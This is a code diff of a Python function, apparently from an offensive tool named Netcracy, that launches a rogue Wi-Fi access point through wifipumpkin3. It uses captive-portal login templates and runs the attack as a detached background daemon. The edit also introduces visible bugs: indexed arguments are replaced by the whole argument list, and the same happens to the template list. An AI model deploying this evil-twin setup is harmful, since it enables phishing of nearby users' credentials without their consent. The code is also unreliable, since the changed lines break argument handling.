@@ -87,23 +87,22 @@ def get_captiveflask_templates():
                     
     return sorted(list(templates)) if templates else ["DarkLogin", "loginPage", "FlaskDemo"]
     
-def handle_rogue_ap(args):
-    target_device = args[0] if len(args) >= 1 else "wlan0"
-    chosen_ssid = args[1] if len(args) >= 2 else ""
-    chosen_template = args[2] if len(args) >= 3 else ""
+import pty
 
-    # Prompt for SSID if not provided in command
+def handle_rogue_ap(args):
+    target_device = args if len(args) >= 1 else "wlan0"
+    chosen_ssid = args if len(args) >= 2 else ""
+    chosen_template = args if len(args) >= 3 else ""
+
     if not chosen_ssid:
         chosen_ssid = input("[?] Enter target SSID: ").strip()
         if not chosen_ssid:
             print("[-] Error: SSID parameter required for Rogue AP.")
             return
 
-    # If template was passed in command (e.g., start rogue ap wlan0 MyWiFi DarkLogin), use captiveflask
     if chosen_template:
         chosen_proxy = "captiveflask"
     else:
-        # Interactive Proxy Picker (eviltq3, captiveflask, pumpkinproxy)
         proxies = ["eviltq3", "captiveflask", "pumpkinproxy"]
         print("\n[?] Select Proxy Engine:")
         for idx, p in enumerate(proxies, 1):
@@ -111,7 +110,6 @@ def handle_rogue_ap(args):
         p_choice = input("    Choice [1-3]: ").strip()
         chosen_proxy = proxies[int(p_choice) - 1] if p_choice in ["1", "2", "3"] else "captiveflask"
 
-        # Interactive Template Picker from misc.custom_captiveflask
         if chosen_proxy == "captiveflask":
             templates = get_captiveflask_templates()
             print("\n[?] Select CaptiveFlask Template (misc.custom_captiveflask):")
@@ -123,32 +121,74 @@ def handle_rogue_ap(args):
             elif t_choice:
                 chosen_template = t_choice
             else:
-                chosen_template = templates[0]
+                chosen_template = templates
 
     print(f"\n[+] Netcracy -> Initializing Rogue AP on {target_device} (SSID: {chosen_ssid} | Proxy: {chosen_proxy})...")
 
-    # Build .pulp script to configure and start wifipumpkin3 behind the scenes
-    pulp_lines = [
+    xpulp_cmds = [
         f"set interface {target_device}",
         f"set ssid {chosen_ssid}",
         f"set proxy {chosen_proxy}",
     ]
     if chosen_proxy == "captiveflask" and chosen_template:
-        pulp_lines.append(f"set captiveflask.{chosen_template} true")
-    pulp_lines.append("start\n")
+        xpulp_cmds.append(f"set captiveflask.{chosen_template} true")
+    xpulp_cmds.append("start")
+    xpulp_str = "; ".join(xpulp_cmds)
 
-    with tempfile.NamedTemporaryFile(mode="w", suffix=".pulp", delete=False) as temp_pulp:
-        temp_pulp.write("\n".join(pulp_lines))
-        pulp_path = temp_pulp.name
+    log_path = "/tmp/wifipumpkin_bg.log"
+    if os.path.exists(log_path):
+        os.remove(log_path)
 
-    log_file = open("wifipumpkin_bg.log", "w")
-    process = subprocess.Popen(
-        ["sudo", "wifipumpkin3", "-p", pulp_path],
-        stdout=log_file,
-        stderr=subprocess.STDOUT,
-        start_new_session=True
-    )
-    print(f"[+] Netcracy -> Rogue AP active in background (PID: {process.pid} | Log: wifipumpkin_bg.log)")
+    # Fork a detached background process to hold the PTY open so wifipumpkin3 never sees EOF
+    pid = os.fork()
+    if pid == 0:
+        os.setsid()
+        master_fd, slave_fd = pty.openpty()
+        proc = subprocess.Popen(
+            ["wifipumpkin3", "--no-colors", "--xpulp", xpulp_str],
+            stdin=slave_fd,
+            stdout=slave_fd,
+            stderr=slave_fd,
+            close_fds=True
+        )
+        os.close(slave_fd)
+        with open(log_path, "w") as log_f:
+            while proc.poll() is None:
+                try:
+                    data = os.read(master_fd, 1024)
+                    if data:
+                        log_f.write(data.decode("utf-8", errors="ignore"))
+                        log_f.flush()
+                except OSError:
+                    break
+        os._exit(0)
+
+    # Parent process: watch /tmp/wifipumpkin_bg.log for up to 8 seconds and print subsystem statuses
+    print("[*] Waiting for AP subsystems to initialize...")
+    subsystems = ("hostapd", "pydns", "pydhcp", "captiveflask", "eviltq3", "pumpkinproxy", "error")
+    shown = set()
+    start_time = time.time()
+
+    while not os.path.exists(log_path) and time.time() - start_time < 3:
+        time.sleep(0.1)
+
+    if os.path.exists(log_path):
+        with open(log_path, "r") as reader:
+            while time.time() - start_time < 8:
+                line = reader.readline()
+                if not line:
+                    time.sleep(0.2)
+                    continue
+                clean_line = line.strip()
+                if clean_line and any(k in clean_line.lower() for k in subsystems):
+                    if clean_line not in shown:
+                        print(f"    {clean_line}")
+                        shown.add(clean_line)
+                if len(shown) >= 4:
+                    time.sleep(0.5)
+                    break
+
+    print(f"\n[+] Netcracy -> Rogue AP active in background (Daemon PID: {pid} | Log: {log_path})")
     
 def handle_wlan0mon(args):
     target_device = args[0] if len(args) >= 1 else "wlan0"
